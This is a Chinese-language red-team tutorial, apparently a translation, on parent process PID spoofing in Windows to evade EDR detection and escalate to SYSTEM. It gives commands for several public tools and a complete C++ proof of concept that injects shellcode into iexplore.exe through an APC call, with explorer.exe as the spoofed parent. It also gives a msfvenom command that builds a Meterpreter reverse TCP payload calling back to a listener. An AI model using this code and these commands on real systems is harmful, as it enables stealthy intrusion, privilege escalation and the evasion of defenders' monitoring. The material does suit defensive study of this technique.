## 文章正文
监控父进程和子进程之间的关系是威胁检测团队检测恶意活动的常用技术，例如，如果powershell是子进程，而Microsoft
Word是父进程，这种这种异常行为各种EDR可以很容易地检测到，这时红队可以考虑使用父进程PID欺骗作为逃避方法。  
Windows
API——"CreateProcess"允许用户传入一个用于分配父进程PID的参数，这意味着当恶意进程从实际执行的父进程创建时，它可以使用其他的进程作为其父进程。最初这项技术是由Didier
Stevens在2009年提出，于此同时他还发布了一个用C++编写的POC([SelectMyParent](http://www.didierstevens.com/files/software/SelectMyParent_v0_0_0_1.zip//
"SelectMyParent")），它允许用户通过指定PID来选择其父进程，"CreateProcess"函数与"STARTUPINFOEX"和"LPPROC_Thread_ATTRIBUTE_LIST"一起使用：
    SelectMyParent.exe notepad 508
PID 508对应于负责登录活动、密码更改等操作的"lsass.exe"进程，在执行完上述命令之后Notepad将在lsass.exe进程下创建  
对进程属性的检查显示notepad以系统级权限运行，这是因为子进程(notepad.exe)获得了父进程(lsass.exe)的特权:  
在Meterpreter会话中，可以通过指定进程名称来检索当前会话的PID：
    getpid
    ps lsass.exe
## PowerShell
F-Secure发布了一个PowerShell脚本([PPID-Spoof](https://github.com/countercept/ppid-spoofing "PPID-Spoof"))，它可以用于父进程欺骗，该脚本包含嵌入的C#代码，以便与"CreateProcess" Windows
API进行交互。
    public static extern bool CreateProcess(
       string lpApplicationName, 
       string lpCommandLine, 
       ref SECURITY_ATTRIBUTES lpProcessAttributes,  
       ref SECURITY_ATTRIBUTES lpThreadAttributes, 
       bool bInheritHandles,  
       uint dwCreationFlags, 
       IntPtr lpEnvironment, 
       string lpCurrentDirectory, 
       [In] ref STARTUPINFOEX lpStartupInfo,  
       out PROCESS_INFORMATION lpProcessInformation);
该工具接受3个参数，即父进程的pid、子进程的系统路径和用于代码执行的任意dll的路径：
    PPID-Spoof -ppid 3556 -spawnto "C:\Windows\System32\notepad.exe" -dllpath pentestlab.dll
notepad将在powershell的上下文中执行，dll将在notepad.exe内部加载：  
由于dll被加载到进程内部，所以执行之后将会返回一个Meterpreter会话：  
一种更隐蔽的方法是在"lsass"进程中加载dll，这样一来威胁检测团队必须检查EventHeader
ProcessId和ParentProcessID来识别进程欺骗
    PPID-Spoof -ppid 3244 -spawnto "C:\Windows\System32\lsass.exe" -dllpath pentestlab.dll
之后将在加载任意dll的系统上创建一个新的"lsass"进程，这个场景允许红队加载"合法"环境Process：  
Meterpreter会话将以进程ID 1312打开，该进程ID对应于"rundll32"进程，该进程执行的dll是"lsass.exe”的子进程：  
Andrea
Pierini通过在Powershell脚本中嵌入C#代码实现了父进程PID欺骗技术，该脚本将创建一个新的子进程，该进程将把用户定义的任何进程作为父进程，与F-Secure脚本类似，使用"CreateProcess()"API来执行欺骗
    Import-Module .\psgetsys.ps1
    [MyProcess]::CreateProcessFromParent(436,"C:\Windows\System32\cmd.exe","")
创建的进程将获得父进程(winlogon.exe)的特权(SYSTEM)  
## C++
早在2017年，Adam Chester在他的[博客](https://blog.xpnsec.com/becoming-system/
"博客")中解释了Meterpreter的"getsystem"命令是如何在后台工作的，为了将进程的权限从管理员提升到系统，Adam在2014年扩充了Raphael
Mudge的文章，内容是关于Meterpter用来提升到系统权限的三种技术。  
[Getsystem-Offline](https://github.com/xpn/getsystem-offline "Getsystem-Offline")二进制文件利用windows的"ImpersonateNamedPipeClient"API来提升它对系统的权限，原理是通过创建和实施一个服务来实现的，该服务作为系统运行以连接到进程的命名管道，并使用"ImpersonateNamedPipeClient"API来创建提升的模拟Token
    getsystem-offline.exe
默认情况下，二进制文件将以提升的权限打开新的命令提示符  
我们也可以通过修改代码以执行任意二进制文件:  
根据Microsoft文档表述，"异步过程调用"是在特定线程的上下文中异步执行的函数，Halil Dalabasmaz在他的C++工具[APC-PPID](https://github.com/hlldz/APC-PPID "APC-PPID")中使用了一种进程注入方法，实现了父pid欺骗。  
最初，函数"getParentProcessID()"用于检索父进程的PID，"TlHelp32.h"支持"CreateToolhelp32Snapshot"函数，该函数负责拍摄指定进程的快照(explorer.exe)，拍摄快照时，将检索进程大小和PID，并关闭句柄：
    DWORD getParentProcessID() {
        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        PROCESSENTRY32 process = { 0 };
        process.dwSize = sizeof(process);
        if (Process32First(snapshot, &process)) {
            do {
                        //If you want to another process as parent change here
                if (!wcscmp(process.szExeFile, L"explorer.exe"))
                    break;
            } while (Process32Next(snapshot, &process));
        }
        CloseHandle(snapshot);
        return process.th32ProcessID;
    }
Windows API "CreateProcess"用于在系统(Iexplore.exe)上创建一个具有"STARTUPINFOEXA"结构的新进程
    #include 
    #include 
    #include 
    DWORD getParentProcessID() {
        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        PROCESSENTRY32 process = { 0 };
        process.dwSize = sizeof(process);
        if (Process32First(snapshot, &process)) {
            do {
                        //If you want to another process as parent change here
                if (!wcscmp(process.szExeFile, L"explorer.exe"))
                    break;
            } while (Process32Next(snapshot, &process));
        }
        CloseHandle(snapshot);
        return process.th32ProcessID;
    }
    int main() {
        //Shellcode, for example; msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x EXITFUNC=thread -f c
        unsigned char shellCode[] = "";
        STARTUPINFOEXA sInfoEX;
        PROCESS_INFORMATION pInfo;
        SIZE_T sizeT;
        HANDLE expHandle = OpenProcess(PROCESS_ALL_ACCESS, false, getParentProcessID());
        ZeroMemory(&sInfoEX, sizeof(STARTUPINFOEXA));
        InitializeProcThreadAttributeList(NULL, 1, 0, &sizeT);
        sInfoEX.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, sizeT);
        InitializeProcThreadAttributeList(sInfoEX.lpAttributeList, 1, 0, &sizeT);
        UpdateProcThreadAttribute(sInfoEX.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &expHandle, sizeof(HANDLE), NULL, NULL);
        sInfoEX.StartupInfo.cb = sizeof(STARTUPINFOEXA);
        CreateProcessA("C:\\Program Files\\internet explorer\\iexplore.exe", NULL, NULL, NULL, TRUE, CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, reinterpret_cast(&sInfoEX), &pInfo);
        LPVOID lpBaseAddress = (LPVOID)VirtualAllocEx(pInfo.hProcess, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        SIZE_T *lpNumberOfBytesWritten = 0;
        BOOL resWPM = WriteProcessMemory(pInfo.hProcess, lpBaseAddress, (LPVOID)shellCode, sizeof(shellCode), lpNumberOfBytesWritten);
        QueueUserAPC((PAPCFUNC)lpBaseAddress, pInfo.hThread, NULL);
        ResumeThread(pInfo.hThread);
        CloseHandle(pInfo.hThread);
        return 0;
    }
Metasploit实用程序"msfvenom"可以用于生成c语言的shellcode：
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.13 LPORT=4444 EXITFUNC=thread -f c > pentestlab.txt
之后替换shellCode[]:  
在目标系统上执行二进制文件将创建一个新的进程(Iexplore.exe
)，该进程的父进程是explorer.exe，shellcode将通过使用用户模式异步过程调用在internet explorer进程的内存空间中执行:  
之后将会返回一个目标主机的Meterpreter会话：  
查看目标系统的进程将显示"iexplore.exe"已成功创建  
查看进程属性将验证父进程是"explorer.exe"，这个POC实现了一个更隐蔽的进程注入方法来隐藏进程内部的shellcode，并且由于explorer和internet
explorer都是有效的，Microsoft系统进程将绕过EDR检测:  
Julian Horoszkiewicz基于Didier Stevens的工作开发了一个C++(PPID-Spoof)工具，它可以用于父进程欺骗，并且允许用户选择父进程PID
    spoof.exe pentestlab.exe 1116
一旦在目标主机上创建了进程，将执行任意负载并打开一个会话  
在process explorer中查看PID的进程细节可以看到该进程是explorer.exe的子进程：  
## CSharp
[Getsystem](https://github.com/py7hagoras/GetSystem
"Getsystem")二进制文件是用c#开发的，它实现了父进程PID欺骗，以便提升对系统的权限，这是通过类似于F-Secure实验室发布的代码的"CreateProcess"API实现的。.Net binary只接受两个参数，即任意可执行文件和将作为父进程的进程名
    GetSystem.exe pentestlab.exe lsass